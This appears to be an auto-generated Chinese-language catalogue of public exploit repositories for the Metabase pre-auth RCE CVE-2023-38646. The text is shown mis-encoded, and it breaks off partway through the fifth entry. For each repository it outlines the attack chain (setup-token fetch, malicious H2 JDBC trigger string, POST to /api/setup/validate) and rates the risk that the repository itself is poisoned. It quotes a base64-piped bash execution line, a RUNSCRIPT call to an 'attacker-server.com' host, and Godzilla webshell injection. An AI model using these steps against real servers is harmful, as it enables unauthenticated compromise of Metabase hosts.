# CVE-2023-38646

> ğŸ“¦ è¯¥CVEæœ‰ **27** ä¸ªç›¸å…³POCä»“åº“

---

## POC #1

**æ¥æº**: [CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md](../2023/CVE-2023-38646-0utl4nder_Another-Metabase-RCE-CVE-2023-38646.md)

## CVE-2023-38646 - Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯å…¬å¼€è®¿é—®æˆ–æ”»å‡»è€…ä½äºåŒä¸€ç½‘ç»œ

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—æœåŠ¡å™¨æƒé™ã€‚æ¼æ´å­˜åœ¨äº Metabase 0.46.6.1 ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ 1.46.6.1 ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æ ¹æ®æœç´¢ç»“æœï¼Œå·²ç»æœ‰å…¬å¼€çš„ PoC ä»£ç å¯ç”¨ (ä¾‹å¦‚ï¼Œgithub.com/threatHNTR/CVE-2023-38646)ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åŸºäº Assetnote çš„ä¸€ç¯‡å…³äºè¯¥æ¼æ´åˆ†æçš„æ–‡ç« ã€‚å®ƒé€šè¿‡åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥é…ç½®ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥ URLï¼Œåœ¨è¿æ¥æ•°æ®åº“æ—¶è§¦å‘æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š

1.  **æ„é€ æ¶æ„ JSON Payload:**  è¯¥ JSON payload ç”¨äºåˆ›å»ºæˆ–ä¿®æ”¹ Metabase ä¸­çš„æ•°æ®åº“è¿æ¥ã€‚ å…¶ä¸­ `classname` è¢«è®¾ç½®ä¸º `org.h2.Driver` , `subname` åŒ…å«æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²,å­—ç¬¦ä¸²åˆ©ç”¨ H2 çš„ `CREATE TRIGGER` ç‰¹æ€§ï¼Œåœ¨INFORMATION_SCHEMA.TABLESä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨, è¯¥è§¦å‘å™¨ä¼šåœ¨æ¯æ¬¡æŸ¥è¯¢è¯¥è¡¨æ—¶æ‰§è¡ŒåµŒå…¥çš„ JavaScript ä»£ç , JavaScriptä»£ç è´Ÿè´£æ‰§è¡Œå‘½ä»¤.
2.  **å‘é€Payload:** é€šè¿‡å‘é€ POST è¯·æ±‚åˆ° Metabase API ç«¯ç‚¹ï¼ˆé€šå¸¸æ˜¯ /api/setup/validate æˆ–å…¶ä»–ç›¸å…³ç«¯ç‚¹ï¼‰ï¼Œå°†æ„é€ çš„ JSON payload å‘é€ç»™ Metabase æœåŠ¡å™¨ã€‚ç”±äºè¯¥æ¼æ´æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå› æ­¤æ— éœ€æä¾›ä»»ä½•èº«ä»½éªŒè¯ä¿¡æ¯ã€‚
3.  **è§¦å‘ RCE:** Metabase æœåŠ¡å™¨å°è¯•ä½¿ç”¨æä¾›çš„é…ç½®è¿æ¥åˆ° H2 æ•°æ®åº“æ—¶ï¼Œæ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ä¼šè¢«è§£æå’Œæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ PoC çš„ä¸»è¦ç›®çš„æ˜¯æ¼”ç¤ºå¦‚ä½•åˆ©ç”¨è¯¥æ¼æ´ã€‚ åˆ†æä»£ç ï¼Œå‘ç°é«˜é£é™©çš„è¡Œä¸ºæ˜¯æ‰§è¡Œ `java.lang.Runtime.getRuntime().exec('bash -c {echo,BASE64COMMAND}|{base64,-d}|{bash,-i}')`ã€‚è¿™è¡Œä»£ç å…è®¸æ‰§è¡Œä»»æ„çš„ bash å‘½ä»¤ã€‚æŠ•æ¯’é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **å‘½ä»¤æ³¨å…¥é£é™©ï¼š**  è™½ç„¶ä»£ç ä¸­ä½¿ç”¨äº† Base64 ç¼–ç ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯èƒ½é€šè¿‡ä¿®æ”¹ Base64 ç¼–ç çš„å†…å®¹æ¥æ³¨å…¥æ¶æ„å‘½ä»¤ã€‚
*   **æƒé™æå‡é£é™©ï¼š**  ç”±äºä»£ç ä»¥ Metabase æœåŠ¡å™¨çš„æƒé™è¿è¡Œï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥æ¼æ´æå‡æƒé™ã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ä¸»è¦æ¥è‡ªäºå‘½ä»¤æ³¨å…¥çš„å¯èƒ½æ€§ï¼Œä½†è¿™å–å†³äºå¦‚ä½•ä½¿ç”¨å’Œä¿®æ”¹ PoCã€‚æ•´ä½“æŠ•æ¯’å¯èƒ½æ€§è¾ƒä½ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘è®¤ä¸ºè¯¥ PoC ä»£ç çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦1%ã€‚å› ä¸ºä½œè€…å·²ç»è¯´æ˜äº†è¿™æ˜¯ä¸€ä¸ªæ¼æ´çš„æ‰©å±•ï¼Œæ„åœ¨è§£å†³ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„åˆ©ç”¨é—®é¢˜ï¼Œå¹¶ä¸”ä¸»è¦ä»£ç é€»è¾‘æ˜¯åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼Œè€Œä¸æ˜¯å¼•å…¥æ–°çš„ã€éšè”½çš„æ¶æ„ä»£ç ã€‚


**é¡¹ç›®åœ°å€:** [0utl4nder/Another-Metabase-RCE-CVE-2023-38646](https://github.com/0utl4nder/Another-Metabase-RCE-CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #2

**æ¥æº**: [CVE-2023-38646-AnvithLobo_CVE-2023-38646.md](../2023/CVE-2023-38646-AnvithLobo_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯é€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶æ‰§è¡Œé¢„å…ˆè®¾å®šçš„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **è·å–Tokenï¼š** é¦–å…ˆï¼Œé€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å–ä¸€ä¸ªsetup tokenã€‚
2.  **æ„é€ Payloadï¼š**  ç„¶åï¼Œæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åˆ©ç”¨`CREATE TRIGGER`è¯­å¥åˆ›å»ºè§¦å‘å™¨ï¼Œåœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œå‰è§¦å‘ã€‚è§¦å‘å™¨æ‰§è¡Œçš„JavaScriptä»£ç ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
3.  **Base64ç¼–ç ï¼š** ä½¿ç”¨Base64å¯¹åå‘shellæŒ‡ä»¤è¿›è¡Œç¼–ç ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦å½±å“ã€‚
4.  **å‘é€Payloadï¼š**  æœ€åï¼Œå°†æ„é€ å¥½çš„JSON payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘æ¼æ´ã€‚

**æœ‰æ•ˆæ€§ï¼š**  æä¾›çš„PoCä»£ç æœ‰æ•ˆï¼Œå¯ä»¥æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ã€‚

**æŠ•æ¯’é£é™©ï¼š**  ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è„šæœ¬çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å¹¶æ‰§è¡Œåå‘shellã€‚ä½œè€…æä¾›çš„ä»£ç é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•æ¶æ„ä»£ç ç‰‡æ®µæˆ–è€…éšè—çš„åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½ä¸æè¿°ä¸€è‡´ï¼Œç›®çš„æ˜¯åˆ©ç”¨Metabaseçš„æ¼æ´æ¥è·å–è¿œç¨‹ä»£ç æ‰§è¡Œæƒé™ã€‚å› æ­¤, æŠ•æ¯’é£é™©è¯„ä¼°ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [AnvithLobo/CVE-2023-38646](https://github.com/AnvithLobo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #3

**æ¥æº**: [CVE-2023-38646-Boogipop_MetabaseRceTools.md](../2023/CVE-2023-38646-Boogipop_MetabaseRceTools.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1, Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™çº§åˆ«ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼åˆ†æå¦‚ä¸‹ï¼š

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æœªæˆæƒè®¿é—®ï¼š** è¯¥æ¼æ´æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ã€‚
2.  **RCEï¼š**  æ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶çš„è¯·æ±‚ï¼Œæ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„ä»»æ„å‘½ä»¤ã€‚
3.  **å…·ä½“åˆ©ç”¨ï¼š** æ ¹æ®æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ”»å‡»æµç¨‹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š
    *   **éªŒè¯æ¨¡å—ï¼š**  å‘`/api/session/properties`ç«¯ç‚¹å‘é€è¯·æ±‚ï¼Œè·å–æœªæˆæƒçš„tokenï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚
    *   **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** åˆ©ç”¨ä¸Šä¸€æ­¥è·å–çš„tokenï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚éœ€è¦æŒ‡å®šmetabase.jarçš„ä½ç½®ã€‚
    *   **å†…å­˜é©¬æ³¨å…¥æ¨¡å—ï¼š** é€šè¿‡ä¿®æ”¹`x-client-data`è¯·æ±‚å¤´æ³¨å…¥å†…å­˜é©¬ï¼Œæ”¯æŒ cmd å’Œ godzilla ä¸¤ç§æ¨¡å¼ã€‚cmdæ¨¡å¼ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œgodzillaæ¨¡å¼åˆ™ç›´æ¥è¿æ¥å“¥æ–¯æ‹‰webshellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ª Metabase RCE å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼ŒåŒ…å«äº†éªŒè¯æ¨¡å—ã€å‘½ä»¤æ‰§è¡Œæ¨¡å—å’Œå†…å­˜é©¬æ³¨å…¥æ¨¡å—ã€‚ä¸»è¦çš„æ½œåœ¨æŠ•æ¯’é£é™©å­˜åœ¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **å†…å­˜é©¬æ³¨å…¥ï¼š** å†…å­˜é©¬æ³¨å…¥æ¨¡å—æœ¬èº«å…·æœ‰è¾ƒé«˜çš„é£é™©ï¼Œå¯èƒ½è¢«ç”¨äºæ¤å…¥æ¶æ„ä»£ç ï¼Œé•¿æœŸæ§åˆ¶æœåŠ¡å™¨ã€‚ä»£ç ä¸­`x-client-data:godzilla`çš„æ–¹å¼è¿æ¥å“¥æ–¯æ‹‰webshellï¼Œé»˜è®¤å¯†ç ä¸ºpassï¼Œå¯èƒ½ä¼šè¢«å…¶ä»–äººåˆ©ç”¨ã€‚
2.  **å‘½ä»¤æ‰§è¡Œæ¨¡å—ï¼š** è™½ç„¶å‘½ä»¤æ‰§è¡Œæ¨¡å—çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹è¯¥æ¨¡å—ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„è¡Œä¸ºï¼Œä¾‹å¦‚ä¸‹è½½å¹¶æ‰§è¡Œæ¶æ„è„šæœ¬ã€‚

è€ƒè™‘åˆ°ä»¥ä¸Šé£é™©ï¼Œè¯¥POCå·¥å…·å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå°¤å…¶æ˜¯å†…å­˜é©¬æ¨¡å—ã€‚éœ€è¦åœ¨ä½¿ç”¨å‰è¿›è¡Œä»£ç å®¡è®¡ï¼Œç¡®ä¿æ²¡æœ‰æ¶æ„ä»£ç ã€‚

**é£é™©è¯„ä¼°ï¼š**

å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
